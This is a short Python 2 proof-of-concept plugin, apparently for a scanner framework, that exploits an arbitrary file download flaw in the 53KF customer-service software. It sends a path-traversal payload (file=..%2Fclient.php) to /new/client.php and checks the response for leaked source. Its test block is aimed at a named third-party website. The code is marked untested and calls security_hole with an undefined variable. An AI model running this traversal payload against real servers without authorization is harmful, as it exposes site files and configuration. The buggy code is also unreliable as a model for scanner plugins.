#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'53KF_file_download',
	'AUTHOR':'ko0zhi,wjk',
	'TIME':'20150325',
	'WEB':' http://www.wooyun.org/bugs/wooyun-2014-086882',
	'DESCRIPTION':'53KF任意文件下载    POC'
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == '53kf':
			return True
	return False

def Audit(services):
	payload = 'm=download&a=downloadFile&file=..%2Fclient.php'
	verify_url =services['url'] + '/new/client.php?%s' % payload
	try:
		rqu =requests.get(verify_url)
		if 'FRAMEWORK_PATH' in rqu.text:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
